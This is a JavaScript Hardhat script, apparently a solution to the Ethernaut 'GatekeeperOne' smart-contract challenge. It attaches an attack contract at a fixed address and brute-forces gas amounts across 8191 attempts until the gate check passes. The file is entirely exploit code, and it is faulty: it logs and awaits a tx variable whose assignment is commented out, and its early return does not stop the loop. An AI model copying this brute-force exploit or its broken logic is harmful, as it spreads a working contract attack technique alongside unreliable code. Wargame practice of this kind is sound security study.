const { assert } = require("chai");

async function main() {
    
    const [deployer] = await ethers.getSigners();
    
    console.log("Deploying contracts with the account:", deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());

    // Deploy
    hack_contract = await ethers.getContractFactory("HackGateKeeperOne");
    hack = await hack_contract.attach("0xb80B1F3E1AeB1878f9ccb78d4a055F1387c06c1C");

    // tx = await hack.open(802929);

    await asyncForEach(Array.from(Array(8191).keys()), async (i) => {
        
        try  {
            gas = 800000 + i - 500 + 3259
            console.log('try gas: ', gas, ' i: ', i);

            await hack.open(gas, {gasPrice: 800000 + 3259 + i})
            console.log('passed with gas -> ', gas);
            return;
        }
        catch (err) {

            //console.log(err)
        }
    });


    console.log("================== tx ===================");
    console.log(tx);

    receipt = await tx.wait();
    console.log("================== receipt ===================");
    console.log(receipt);
}

async function asyncForEach(array, callback) {
    for (let index = 0; index < array.length; index++) {
      await callback(array[index], index, array);
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
});
